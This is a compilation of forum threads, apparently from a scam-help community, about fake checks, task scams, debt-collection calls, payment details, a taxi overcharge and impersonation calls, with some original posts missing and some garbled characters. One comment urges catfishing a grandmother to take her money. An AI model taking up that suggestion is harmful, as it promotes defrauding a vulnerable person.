My advice is to never accept wire transfers or checks from strangers. Simple as. You can ask them to create a Paypal account, or other payment platform of /your/ choice. If they give some excuse for not having any of them, then it's probably not worth dealing with them in the first place. You can also advertise your work on a place like Fiverr or Etsy. Although neither is perfect, you'll at least (in theory) have an extra layer of protection as a seller.

Good luck and godspeed :)
- Anyone that can afford to pay you can afford to use a common money transfer application like Zelle/venmo/cashapp or any other locally accepted app. Anyone that knows your name and account numbers can initiate transactions on your account. 

Your bank might end up giving your money back if it happens (maybe), but don‚Äôt allow yourself to get in that headache.
- There is an option in Square to send an invoice, which would allow someone to pay with their card. Of course Square processes the transaction so they can feel safe you don‚Äôt get their info too. Also, Square provides dispute and protection services. They do charge 3% and less than $1 per transaction processing fee but work that into your cost.
- You're getting scammed.¬† You don't do business with people who aren't allowed to use the safe way to transfer cash.¬†¬†


They don't use those apps because they are scammers.
- >I‚Äôm also doing commissions ... Is there anyway I can safely provide the needed info for them to transfer money?

You can be scammed if you do not FULLY understand who you are working for.  

If it is a legitimate company, then you can accept payments from them by depositing a check from them, or by giving them a copy of a voided check, or by telling them the routing and account number for your bank account, or by giving them a telephone number or e-mail address associated with the Zelle account that is linked to your bank account.

However, if the "company" that you are "working" for is actually a scammer, then giving them ANY information at all could potentially be used by them to help them scam you.
- arent there wr codes available for transfer?
- This depends on what country you are in, as some places like the US let people do things with just a bank account number so people treat them like the nuke launch codes, others like AU/NZ its normal to give it to people inorder to pay you and its an accepted way to do things as we done need stupid apps to clip the ticket on the way thru.
- Contrary to common belief here, accepting checks is actually fine. As long as you know the difference between fund availability and actual clearing of the checks. As described in the !fakecheck automod reply below.

  
And don't play bank for strangers by routing money or paying someone else for them.

  
Even with cash app, you need to be aware of !fakepayment scams.
- Send yhem your account number and bank branch details.
- Create a bank with just ¬£1/$1 in it and then give that account, and ensure you transfer the rest of the funds out of it as soon as they arrive 

In terms of details it varies depending on your country, in the UK it‚Äôs sort code, account number and the name of the account holder
- PayPal offers protections that these others do not.
- There is absolutely no reason that someone doing business on the internet (from the customer end) needs to be paying with a check. 

Furthermore, as OP has stated that they are inexperienced financially, they should not be accepting checks as a rule.

Can using checks be safe? Absolutely. If you are given the check in person/know the person issuing it, and are familiar with your banks policy as it relates to depositing and the availability of funds. But someone in e commerce is just asking for trouble by accepting checks.
- Dude
accepting a check from an internet stranger is not a good idea.¬† No need to open yourself up to that risk.
- Accepting cheques makes you vulnerable to depositing a fake cheque which takes months to be found and reversed, which means OP will have done the commission before finding out the money was bad.

Accepting cheques is very risky.  If you understand that cheques can bounce after quite a long delay, why would you accept them for immediate work?
- You're mistaken on this, even if you know when a check actually clears, that only protects you from fake checks or funds not available. You also need to verify that the check was written by the owner of the account. Over the internet that's basically impossible, and that form of fraud can be reversed after the check clears.

Not only that, but many banks charge fees for the bad checks, so you may be out the fees even if you wait to see if the check clears.
- Hi /u/seedless0, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Hi /u/seedless0, AutoModerator has been summoned to explain the Fake payment scam.

The fake payment scam occurs when someone tries to trick you into thinking that you have received a legitimate payment when no such payment has been made. The most common method they use is sending you an email meant to look like a payment confirmation. In some cases the emails will be almost indistinguishable to a legitimate email sent by the payment service. Scammers are known to also show you screenshots instead of an email. Never trust a screenshot a stranger shows you, because it is probably doctored.

Scammers [spoof](https://en.wikipedia.org/wiki/Email_spoofing) the 'from' email to match an official address, and make you think you received a legitimate email. To combat a fake payment scam, verify online payments by logging in directly to the service. Do not check your junk folder, and do not assume a payment is legitimate based on an email alone. If a payment isn't reflected on your account and the person you are dealing with insists they have sent it, call support and ask about it. [Here](https://i.imgur.com/X9xn8uw.jpg) is an image of a scammer trying to pull off a fake payment scam. There is also a variant of the fake payment scam where you will receive a legitimate but fraudulent payment.

A variant of the fake payment email is just an advance fee scam: the scammer tries to convince you that your funds are on hold, and that you have to upgrade your account by sending the scammer some money to authorize the payment. No payment processor works like this. If you think you're dealing with a scammer, you're probably right. Always trust your gut.


**
- I would not recommend doing this...if the money gets pulled back from the issuing bank (e.g. they were from a stolen/compromised account), OP will not only have to return the money via a new deposit, but will also face overdraft charges.

- Very suspicious and 100% worth ignoring.

Usually I blank any unknown number but sometimes (like you said) legit calls come through as witheld.

Sometimes these aren't even real people - just a recorded voice that says "hello" and when you reply, it confirms that you're a live person and the recorded sales pitch starts. It will then transfer you to a real person.

Hang up , block the number and move on. All will be OK!

Also, is it possible they didn't have my information to begin with bc they had dmed me before saying to vote I said yes but that split second after I saw the acc they were posing warning people about it i blocked and reported it straight away as well as having 2FA setup on me phone to text to my phone number. I've also made sure I got backup codes for my ig and Facebook and even verified myself on ig with my passport

- I'm not clear on what kind of scam you're describing. An IG account was impersonating a society at your school and asked you to vote on something? What happened then?
- It was basically a scam where the scammer had a url link to a website which seemed like u were voting for something but reality was u were giving them ur login details for ig

Title: Cyber scam - Revx Global and some other names
Body: Hi everyone,

If you‚Äôre wondering whether this job offer from Revx Global or some other names is legitimate or a scam, it‚Äôs definitely a scam. 

Here‚Äôs how it works:

They promise to pay you in Bitcoin and may even give you a small amount initially to gain your trust. Then, they‚Äôll encourage you to invest a larger amount, claiming you need to ‚Äúupgrade‚Äù your bonus from a task so-called ‚Äúcombo packs.‚Äù They wanted you to believe that you are the lucky one by getting this combo packs.

The payment they promise is nothing but an illusion. They‚Äôll add fake earnings to your account to make it seem like you‚Äôre making money, but eventually, they‚Äôll pressure you to invest even more. At some point, they‚Äôll close your account without warning, leaving you with nothing.

Be smart and don‚Äôt fall for this scam. Report incidents like this to cybersecurity authorities here: https://www.ic3.gov/

Stay safe and vigilant!

- Generic !task scam

You don‚Äôt pay to work. That‚Äôs not how work works. That should‚Äôve been the one and only red flag you needed.
- It's definitely a scam people. They got me for 13K  left my account dry ,then they wanted me to take out 30K loan to offset the negative balance, so i could get the money i initially put in, to convert it into a cryto coin.  Beware and careful people. i Was looking for a work from home job at the time, so i though this was a miracle.  but actuallly a freaking scam. i've report their site to google.  REVX is a SCAM STAY FAR AWAY FROM THAT SITE.
- I have all admins and customer service phone number. I need to report them.
- Hi /u/t-poke, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

Title: I‚Äôve had several of these types of emails while job searching, all specific for NFCU as their client. Is this a scam?

It seems really fishy, which is why I‚Äôm not signing anything, but didn‚Äôt know if this kind of stuff actually exists.

They just call me, ask me what my rate is, ask a couple underhanded questions about my qualifications, then ask me to sign something. Seems off.

- When you say "underhanded questions", what kinds of questions do you mean? 

And what domain is their email address? 

This may not be a scam. I worked as a contractor for a while after I graduated. The contracting company basically interviewed me first and used my information to fill out a job application for the organization that was hiring. 

When it got to the interview stage, they met with me first to prep me and give me advice. Then they drove me to the interview and introduced me around. These contractors worked with that organization often to find people to fill positions. I think I had an easier time getting hired because they knew what the organization was looking for at different stages of the process.

Title: My Grandma Hates Me Right Now For Trying To Stop Her From Getting Scammed
Body: I made a post last night talking about a site called (sptgmb . Net ) that was charging her ‚Ç¨40 a month. The site has 0 internet traffic. All of the information is private for the site. She is mad at me for telling her to stop giving the information away. She says the site is legit but I have done my research & the site has only 2 references on Google. No legitimate site has 2 references on Google. Also the fact the site says it's from Phoenix Arizona yet the person on the line sounded like one of those Indian call center scammers (not trying to offend anyone). The fact is this is ridiculous that she is after me for trying to stop her from being scammed. She was going to give them more of her information. The only other person who I've seen online with this situation put it as fraud in their bank & they were fine. My grandma on the other hand berates me because she is giving all of her personal information to a site I know is a scam.

- It's been shown that people who are getting scammed do not like being told what they are in a scam and if deep enough will defend their scammers. 

Good job for saving her from herself
- So, it's Pirate Bay for grandmas but costs $40/mo.? Explain to granny that there are free Wearz sites. But then go back in a week to remove the malware she'll pickup.
- The website doesn't even exist. It was probably taken down because it was reported as a scam site.

Your grandma is angry probably because she now knew it was a scam and she took her frustration on you. Don't be upset about it. The highlight is that you saved her losing thousands of dollars.
- !whois sptmgb.net

Negative highlights
The website's owner is hiding his identity on WHOIS using a paid service

This website does not have many visitors

This site is actively preventing credit card chargebacks
- Grandma wants to waste her money.¬† Catfish her and take her money yourself.¬† You know what she's vulnerable to, go for it.¬† Then you can be the hero to use her money to tale care of her.
- She may hate you right now but she‚Äôll thank you later.  Chin up my friend.
- It's easier to fool someone than it is to convince them they've been fooled.
- some people blame the messenger
- I don‚Äôt get it. What service does grandma think the site provides?
- I know it's hard to be yelled at for doing the right thing, but she will thank you eventually. It will just take time. And you DID do the right thing, so, go you!

She seems to be a bit hooked, so keep an eye out: she may well try to get scammed again.
- Yet it does seem to exist http://sptmgb.net/ this is the link. It shows it doesn't exist on the scan advisory site but it "does"
- This is a great idea.  I'm sure there will soon be fake stories on reddit of people who did this.
- I think Mark Twain said the same thing so this is not new.
- I misspelled by 1 letter, sorry. Yea, it exists. But I don't know why your grandma would make transactions with a domain registrar company.
- Yep it was Mark Twain!!
- I am going to make sure she changes her credit card because of this
- This won‚Äôt work. If it‚Äôs a subscription it will follow to her new card. What will work is trying to cancel the subscription, getting no where and then disputing the charges with the credit card.
- You need to request that the 'token' not be transferred to the new card, or the payments will be continued.  You'll have to go to the bank, describe what happened, and work with them to ensure that payment doesn't get transferred to the new card.
- I did not know that could happen. Another reason I appreciate this forum - I've honestly learned so much here. Thanks for posting this üòä

Title: ACE CASH SCAM - ANYONE?
Body: Has anyone gone through this? I received a call from someone named Crystal Williams saying that I had a loan that defaulted with Ace Cash. She proceeded to give me a phone number and a number to call. I called that number because I did have a loan with Ace, but it hasn‚Äôt even been a year since that loan defaulted so I was entirely confused as to how I‚Äôm being summoned into court.

Scheduled the payment plan for the 23rd today and I got an Apple Pay notification saying that Universal Studios resort Orlando tried to take that exact amount payment. And now I‚Äôm entirely confused because the company that so-called had my loan from Ace Cash loans is supposedly called ‚ÄúBerkshire‚Äù, I‚Äôm not even sure if I‚Äôm spelling it correctly. I tried to Google them. They don‚Äôt have a company website or company email or anything. Anyone have any idea??

- I assume a debt buyer purchased your defaulted loan from Ace and that is who is now trying to collect. 

I'm not sure why it would come up as universal studios, so it's possible it's a scam, but my natural assumption would just be a shady collections agency purchased your debt.
- !debt (I think)
- So to understand, you do have a loan that defaulted under Ace Cash? Is it possible to call Ace Cash directly and ask them if this was them, or if it's still in default or what.

That sounds like a scam, but it would require them to know about your actual loan, which is possible, or a lucky guess, but I don't know, could go either way. Universal Studios does not sound right, and Berkshire does not sound right. Maybe Ace Cash got phished or installed malware and scammers got access to your records and they're just going one by one and scamming defaulted loans like yours.
- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Debt collection scam.

If you are positive the debt you're being accused of has never existed or has already been resolved, this is a scam. Keep in mind that companies can change names and debts can be sold, so not recognizing the company you owe isn't necessarily proof of a scam; you should call the company where the debt originated to confirm a debt exists. Be mindful of debt collection laws in your state or country before engaging in any conversation with a debt collection agency, to avoid being liable for debts that may be outside their statute of limitations for collections.

Like legitimate debt collectors, scam collectors may have access to your SSN, address, names of your contacts, etc. from a data breach. They may be calling your family, friends and employer relentlessly with invasive or embarrassing questions about you. They may send you threatening letters, emails and texts that state you will be sued or arrested if you don't immediately pay them X amount of dollars. These are scare tactics to rush you into paying before you have a chance to consider the situation logically. Instruct all of your contacts that this is fraud and to block the calls. If the scammers know a lot about you, you have potentially been involved in a serious data breach.

Here's a guide from r/identityTheft that covers the basics of credit freeze, IRS pins, even replacement SSN and police reports: https://www.reddit.com/r/IdentityTheft/comments/pqb1za/identity_theft_recovery_101/

You need to freeze your credit through the credit bureaus: https://www.reddit.com/r/IdentityTheft/comments/uvv3ij/psa_freezing_your_three_main_credit_reports_is/ and freeze your debit line with Chex Systems https://www.chexsystems.com/security-freeze/place-freeze

Report correctly referenced documents (SSN, drivers license, credit card) as stolen to the respective agencies. If you are unsure of how to move forward, request guidance from local law enforcement. Credit to user l0john51 for this script.

- Omg that‚Äôs what I‚Äôm thinking too! Nothing about that company made sense. But when I called Ace Cash they told me that my loan was sold to another company and phone number. I called like 5 different companies and it all lead back to Berkshire. However Ace did say they do not press legal action on their customer, BUT I don‚Äôt know if that still applied to me because my loan isn‚Äôt with them anymore. But every time I called Berkshire, they‚Äôre so rude. And I asked them today why their payment company says Universal Word Resort Orlando and the agent said it‚Äôs because they‚Äôre a private company and they use that to block their name. And that‚Äôs honestly the dumbest thing I‚Äôve ever heard.
- There‚Äôs no way to confirm if they‚Äôre legit. And when I asked for a debt letter to confirm it, they told me they don‚Äôt send those üòë. I said well I need some sort of proof that you guys are real or legit. Just take me to court at that point
- Berkshire Hathaway? Def a thing.
- The loan is mine and I do owe. However the company just seems so sketchy. I had the money on my Apple Pay too and it didn‚Äôt even go through.
- Yeah I think real debts are supposed to provide "proof of the debt" ie in writing, so that sounds like they are not operating legally. It's possible the debt was sold but this was also a scam almost indistinguishable from the original debt because they got access to the information on your loan, and you still need to pay the original loan. I also don't think you can just use a real merchant's name if you're not them, they can easily obfuscate with random letters as the name like ALKJSH solutions or whatever.
- Don't pay anything until you get it in writing.  And, you will need to get a receipt as well and keep it.
- I don‚Äôt think it‚Äôs that one. This Berkshire they claimed to be a private company for attorneys. But they don‚Äôt have a website because they‚Äôre ‚Äúprivate‚Äù and not ‚Äúopen to the public‚Äù as they claim.
- They keep threatening to take me to Fort Bend County Court, and pay all these lawyer fees but this isn‚Äôt making any sense. They said they can‚Äôt send me anything in writing
- Look up the rules for debt collection in your state, but its my understanding they are legally required to send a demand letter. So if they refuse, any lawsuit would be dismissed
- If they can't send you anything in writing it's not a real debt. Stop paying them.

Title: Am I being scammed? Recently moved off UpWork with an employer
Body: Hi!

I really need a job right now and LinkedIn hasn‚Äôt been working so I recently got a little traction with UpWork.

I have 10 years selling software in San Francisco so I‚Äôm really shocked at how hard it‚Äôs been.

Luckily, I did relocate to Tennessee, so it‚Äôs cheaper, but I feel I‚Äôm struggling at the bottom of the barrel.

Recently, I got a couple contracts off UpWork.

The one we‚Äôll be discussing today, we‚Äôll call him Sanders.

Sanders hired me for 1 week on UpWork and has paid me 20 bucks an hour for 2 days for 5 days on UpWork.

No problem.

At the end of the week he says I did great, which I did do pretty good doing cold calling and setting appointments for him, and he wants to hire me full time, but only for 2k/month.

This is a bit of an insult to me, but, it‚Äôs something to start with, and it‚Äôs easy for me to do it at the same time as other Upwork contracts/interviews. So I agreed to roughly 5/6 hours a day for 2k/month, and we‚Äôve moved off UpWork.

I actually sort of suggested it, but he first asked me if I wanted to be on or off UpWork and I said on. 

He said let‚Äôs start on and move off.

That‚Äôs the agreement.

We talk every day and go over our calls.

His website doesn‚Äôt look great, but he apparently does have a couple of contracts generating leads with a couple businesses.

And his LinkedIn and real company he works for looks real. He‚Äôs supposedly a VP for one company.

But he‚Äôs hired me to help him with his tiny business he‚Äôs trying to start.

So I got an email address and some other credentials to login to, we‚Äôre doing daily updates, but when I got this email from him I got a little spooked:

‚Äî‚Äî‚Äî‚Äî

I will need account and routing #'s for ACH/ direct deposit 

Also name of the bank

‚Äî‚Äî‚Äî‚Äî

Is this standard stuff I‚Äôm over thinking? In my head, it all sort of makes sense. He‚Äôs trying to start a first business, doesn‚Äôt have much infrastructure setup, hence the low pay, but it‚Äôs at least *something*

I‚Äôm dying for work right now

How bad will it be if I share this information with him?

What risks am I facing if I do?

I suggested Venmo or PayPal or Zelle and he said he‚Äôs open to it but might need a w9 from me.

Is this a scam?

Also I called his supposed real employer and pretended I was someone else and asked for him. They did actually go to transfer me and I hung up.

Comments:
- Bank name, routing number, and account number are needed by an employer for direct deposit. You can confirm this with your bank.
- No company with any sense would use a cash app to pay employees or contracts. No person with any sense would ask for such an arrangement. 

Direct deposit is standard for paying people.  Normally a cold request would be concerning but if you‚Äôve been getting properly paid via upwork it seems legitimate to me especially if your work is being used and is visible. 

Instead of fake calling (sheesh) you should be asking for any public accounting documents they can supply to support their claims to being a legal business.
- If it's a real business paying you by direct deposit is the correct thing.  He just needs your account # and ABA#, bank name isn't even necessary since your ABA# already is bank-specific but lots of people don't know that. 

The thing that strikes me as odd is that he would only need a W9 from you if he pays you by cash app. He should be getting that information no matter how he pays you since he will need to send you a 1099 next year. 

He may be trying to pay you under the table and you are trying to get around Upwork taking their cut, you are both taking a risk.  

Can't say for sure if it's a scam until he asks you to do something scammy. 

Don't accept any funds that he then asks you to pay another contractor for. 

Don't accept any checks. If there are required supplies he should buy them and have them sent to you. If he suggests otherwise, it's a scam. 

Never pay anything to get paid.
- I got one payment through Upwork for like 200 bucks so far. I don‚Äôt have access to it until a few days. You think it‚Äôs okay to email that? It was one of his first emails to me in my new email account he made me
- Yeah he mentioned he might want the w9 to protect him with taxes too. It could be a real person with a real little job. Very well. I call these Upwork jobs my ‚Äúgremlin jobs‚Äù. I‚Äôm just a little freaked out! I‚Äôve never done this type of thing before or needed it so much! I think I‚Äôm gonna push for Venmo and say my bank is being weird maybe? I just feel like w9 will have ssn + all my banking info and address - bad news. Scary for such a small thing. If it was more legit I‚Äôd usually fill it out on a portal. Person to person is fucking scary
- I just feel like 200 bucks could be worth it to hack into someone‚Äôs account like that
- The W9 isn't to protect him from taxes. It's so he can report your earnings to the IRS which you will then need to pay taxes on. If you are going to work as a contractor you should research what that involves since you may end up with an unexpected tax bill when you do your 2025 taxes.
- He hasn‚Äôt had me buy anything. Most scammy thing was suggesting moving off UpWork relatively quickly. I almost wish I would have just said let‚Äôs just stay on UpWork
- Except you can't hack an account just by having their account and routing numbers. If it were that easy, direct deposit wouldn't exist. Just think about it, how much of your own account can you access with just your account number?

Scams usually involve getting the info to create a fake notification or transfer to convince you to send money. Unless you give them your password of 2FA codes they don't take over the account.
- Everyone whos ever gotten a check from you or seen one of your checks, has your account and routing numbers
- Also it‚Äôs just him doing the business trying to start it up with me as help
- Is it a violation of Upwork TOS to move off the platform? Are there any protections for you to stay on the platform? If you want to stay on the platform, tell him that.

How did you get paid in previous jobs? Most companies in the US have been paying via direct deposit for 35 years or more.
- So it wouldn‚Äôt be worth it to them to make little ach payments and transfers? I found articles that suggest otherwise
- Direct deposit but never person to person like this
- It is a violation. But then I won‚Äôt have to give a cut to UW. It seemed like he was interested in this from the rip, but looking back, I sort of just wish I would have stuck with it
- That's not what I said. I said its impossible to steal your account with just the info you're providing.

That doesn't mean its not a scam, but it means if it is a scam it hasn't gotten to the part where they scsm you yet.

- Your next steps should be on educating your parents and yourself on common scams so this doesn‚Äôt happen again. That‚Äôs all you really can do. If Facebook won‚Äôt remove the scammers then you need to know how to spot them.

Spend time on this subreddit reading various posts. Even posts that have nothing to do with pets and buying stuff off of Facebook will teach you something. Most scams have the same structure even if it‚Äôs a different twist to each one. For example, the scam your dad fell for was one where he paid a deposit for an item he never saw in person. It‚Äôs not always going to be a dog, it can be a car, an apartment or any item you can think of and it‚Äôs not always going to be on Facebook.

I know it feels awful having to spot all the clues in hindsight, but learning the signs of a scam is important in the aftermath of one. The same scammer knows your dad falls for scams and can come back, with a different FB profile, and try scamming him again. Now that you‚Äôve made this post here on Reddit, scammers will DM you saying they can recover your dad‚Äôs stolen money or even get revenge on his scammer. Please stick around and read as much as you can.
- Same advice to anyone with a pet scam.

  
Don't get a pet you can't meet first.
- You should stop trying to buy pets you've *never seen in person*. 

And what does any of this have to do with a dead grandmother anyway?
- People make hasty decisions when they're feeling sad or upset. This one is water under the bridge now - there's no way to force the scammer to produce a dog, and in any case you have no guarantee that the dog would be healthy. The money is gone.

Every town and city in the US has animal shelters full of lovely dogs and puppies that need a home. You can find rescue groups that specialize in certain breeds, or go with a pup that just looks cute and is the right size/age. Start by visiting your local municipal shelter in person, and if there isn't one, try petfinder.com. (Be attentive there too - most of the listings are from legit rescue groups, but they're not immune from scammers. Always acquire a pet in person to be sure it's healthy.) Petco also now features rescue animals at many stores.

There is nothing more healing to the heart than adopting a dog that is stuck in a shelter and facing an uncertain future.
- Who orders a dog on Facebook without ever even seeing it?
- Don‚Äôt buy dogs you‚Äôve never seen in person off Facebook.

How is this related to your dead grandmother?

Go to a shelter and ADOPT A DOG.
- How much money did they send and how did they send the money?
- There's nothing to be done. You can't recover the money. Maybe take your folks to the local animal shelter. I'm sure they'll find a pup to melt their hearts!
- Don't endorse FB and Mark "Chia Pet" Zuckerberg for anything.

Looking for a companion/pet? Research your local shelters where you can meet the critters that are up for adoption. Never, ever try to obtain an animal from an online ad from a far away location.  There are some wholesome videos of families going to shelters and having cats & dogs literally leaping into their arms with body language saying "ADOPT ME".

- FB does not care about all these scams on their platform.  Use your local humane shelter or rescue operation. All my dogs have come from those groups and they have been great dogs.

- Ever notice the new thing on r/scams is providing background mental health issues to justify their getting scammed; I have depression, i lost my job, gf dumped me......
- Lmao he was sad and wanted a dog
- Enough people for the scammers to see it as a good use of their time.
- This might be because a victim always believed that he was too smart to fall for a scam, and has not yet faced up to being a victim because of his ignorance or greed.

Or, it may be that the victim is genuinely going through a rough parch, and her thinking is clouded by current problems.
- A bit harsh, surely? People post here both for advice and because they're upset. Seems understandable to me.
- Harsh? Where was any judgement in my post? It was an observation.
- It does feel harsh. And it's hard to think clearly when the grief is raw.

Title: Sick to my stomach. Advice needed.
Body: Like an idiot I applied to securefillings.com for a passport renewal. Before anyone lectures me‚Ä¶ I know. I‚Äôve beat myself up all morning over this so please be kind.

I‚Äôve contacted the credit card I used who put a flag on the account for the charge. No activity has happened so they suggested no new card now (Amex). I‚Äôll dispute that charge if it posts.

I also created a case with report fraud.ftc.gov so I have a case number in the event I ever need to prove my identity was stolen. Outside of checking credit karma for any activity over the next year, should I be doing something else? If so, should I be panicking enough to purchase a service like lifelock?

Update: I now have freezes in all 3 credit reports (Equifax, experian, and TransUnion).

- I'm an attorney but not your attorney. I never advise anyone to purchase life lock. There are much better ways to get help, and freezing your credit is free.

If someone uses your information to open an account (or multiple accounts) in your name, an attorney who is a member of the National Association of Consumer Advocates (NACA) and practices in Fair Credit Reporting Act work will almost certainly help you on a contingency basis (so, nothing out of pocket). 

Also, it's generally a bad idea to set up any accounts with Equifax, Experian, or Trans Union. The terms of service will contain arbitration agreements that purport to give up your right to a jury trial.

THE way to get no strings attached copies of your credit file is to go to [www.annualcreditreport.com](http://www.annualcreditreport.com).
- They got ALL your information?
- Saw the update ^ don't forget ChexSystems üôè
- >should I be panicking?

And how would this help?
- My wife just called me and asked if I scheduled a passport appointment at the post office.  I said no and she said she got a text to that effect, from the same number the PO used to contact her a year ago when she got a passport.

So either someone hacked the PO or they‚Äôre spoofing phone numbers.  Either way it looks like the latest scam.
- Thank you for that information. Sincerely appreciated!
- Don‚Äôt you have to create accounts with the companies in order to freeze your credit with each one?
- Yes, it was a passport renewal service.
- It wouldn‚Äôt but I just need direction if I need to do more than what I already have. I updated the post to remove that piece.
- You're welcome! I also tell people to stay away from Wells Fargo's credit monitoring because they purport to bind folks to arbitration *on behalf of Experian*.
- Absolutely not. They try to funnel people to do it that way to serve their own purposes, but you can call them instead.
- Well they're (the criminals)just going to verify it all right now with the multiple leaks so just keep an eye out. Can just put freeze on credit report for added security. This stuff is more reactive than proactive.
- If you gave them your passport number, you may want to report your passport as stolen and get a new one entirely.

I renewed my passport online today through the US State Department website and the application took all of 15 minutes. In the future, only use official US Government channels for this stuff (while it's still functional, that is).
- Make sure it's with all 3 credit bureaus if you're in the US.
- Thank you for that information. It is sincerely appreciated.
- Thank you. I‚Äôll do this right now.

Title: Taxi driver scammed me in Rio
Body: Taxi charged me 10 times the amount that he should have and I noticed after he left :(

We tried to call an Uber but our rides got cancelled 2 times so we just hailed a cab from the street (first mistake) since we were in a hurry.

The driver told us it will be approximately 40 BRL to get us to our destination. This was the same amount calculated by Uber so nothing suspicious at that point.

On the way there he was trying to tell us that he can take us up to Christ the Redemeer statue, that he can wait for us etc. We said "no thank you" to everything.

When we reach I see the taxi meter shows 41.3 or 43 BRL. I say I want to pay by card so he takes out the tiny device and puts in the amount. He put in 410 BRL and I didnt notice.  
I stupidly ask him if the transaction went through, he said yes and gave me a satisfied smile. (Now I know why he smiled like that).  
I should have asked for a receipt, I should have checked my phone then ....I didnt do all of this because we were in a hurry and I was also feeling quite sick + I trusted he will put in the amount from the meter.

We get off and as he drives away I check my phone, 64 Euros charged!

We went to the police station and reported this. The police was not surprised since this isn't the first time they heard about this. Another Uber driver later also confirmed that this is an ongoing scam that first started in Sao Paolo and is now going on in Rio.

I contacted my bank and asked them to revoke the transaction. I provided the police report and explained what happened.

They are refusing to cancel/ revoke because I athorized this payment with Google Pay. They say I should contact this person and provide proof that he should've charge me less.

I thought that since I have a police report , since they took it seriously because it keeps happening, that its enough for them to revoke.

Obvioulsy this is a dead end because all I have is his name from the transaction (very common name). Dont even know the taxi company.

All of this to say, pay attention to these things.

Always use Uber and avoid hailing cabs.

Thank you for reading!

- You won't be getting a refund because as far as your bank is concerned you might have been in on it and split it with the driver so they won't be eating that, sorry. important lesson to pay attention.
- Very common, especially in touristy areas or if the driver suspects you‚Äôre a tourist. Applies to large parts of Central/South America as well as Southeast Asia. 

Ensure the meter is used or negotiate in advance the amount, check amounts charged. In some countries, all cabs are required to have a specific license plate or some other form of identification to distinguish between fake/illigitmate cabs‚Äîknow and check this in advance.

In the Central/South Americas in particular, it‚Äôs just as likely to get mugged when getting into a cab hauled off the street. Always have the hotel or restaurant get one for you vs. hailing it yourself.

When using Uber, take all the normal precautions of verifying the vehicle, etc. It‚Äôs easy to spot a tourist waiting on ride share, so you‚Äôre opening yourself up to being taken advantage of (or worse).
- It‚Äôs why I use Uber or similar apps.

Title: Police officer called saying my mom had been arrested for shoplifting and I needed to pay for the items to release her.
Body: I knew it was a scam immediately but I figured I'd post for others to be aware of.

Just got a call from a hidden number. Guy said he was a police officer with a major city about 30 miles from me. He asked "are you..." and used my full name. Then asked if "____" was my mother. I said yes.

He proceeded to tell me that she had been arrested at a Walmart in that city for shoplifting and they could release her immediately if I paid for the items. This was semi believable as she had been arrested 15ish years ago for the same thing at a grocery store.

I asked to talk to her and he said no she was being detained and wasn't allowed to talk to anyone but he could send the link for me to pay for everything via walmarts website and she would be released and could call me herself.

I told him not to bother. My mom died 3 months ago and her ashes are sitting across from me on the kitchen counter. 

What do you know he hung up after that.

- A while back my mom got a call that her grandson was in jail and needed to be bailed out.  She asked which one and they gave a name that wasn‚Äôt correct.  They then gave multiple names that were incorrect.  She hung up.

Next day she got a call from ‚ÄòMicrosoft Support‚Äô offering to clean the viruses from her PC.  She said ‚Äúyou sound like the same guy who called yesterday about my grandson‚Äù and he hung up.
- Yes I got a call like this once from a "Financial Advisor" insisting he speak with my husband.  Told me he was returning a call that my husband had made to him.  I told him my husband had been dead a number of years, must have been a really long distance call.
- "As long as you feed her, you can keep her. We're a 'tough love' kind of family--believe me, she'll understand. I hope you have a GREAT day!  Bye, now!"
- had the "police" call me asked them what are the chances of us both being police ? (held my hand over the phone) and asked how the trace on the line was going ? back to the call and was cut off and blocked :)
- Surprised that it wasn't random gift cards this time.
- LOL I got a similar call years ago because I'm living in the house my mom owned before she passed.  Guy on the phone wanted to talk to her about her Medicare policy.  I told him he'd need a Ouija board and hung up.
- Sorry for your loss. The idea of throwing up insane roadblocks is a very funny idea. Brought up an old memory that when door/telemarketers where a problem I‚Äôd let the magazine newspaper sales people do their entire pitches about asking you about your favorite subjects and topics and after three of four of their ‚Äúdon‚Äôt take no‚Äù selling attempts I‚Äôd say ‚ÄúI‚Äôm sorry I don‚Äôt know how to read‚Äù. Always a good reaction.
- My mom got the whole Microsoft virus she‚Äôd have to pay to have support remove. Luckily we had talked about it so she told them thanks for the heads up, her son works in cybersecurity for the government so she‚Äôd let him know. Very quick phone click and she never was bothered again.
- Same exact thing. Maybe 3 months ago told him I didn't know dead people spent time stealing from Walmart
- When I had a landline and didn‚Äôt have caller ID I would tell them excuse me someone was at the door and put the phone down. Never to return.
- I got a Facebook message from my great aunt Bess a few years ago saying that she had been kidnapped and that they were going to kill her if I didn't pay up. I asked If this would be worse than the first time she died 6 months earlier and she said that that was a hoax she had never died but she was going to die if I didn't pay them. 

Amazing recovery on their part.
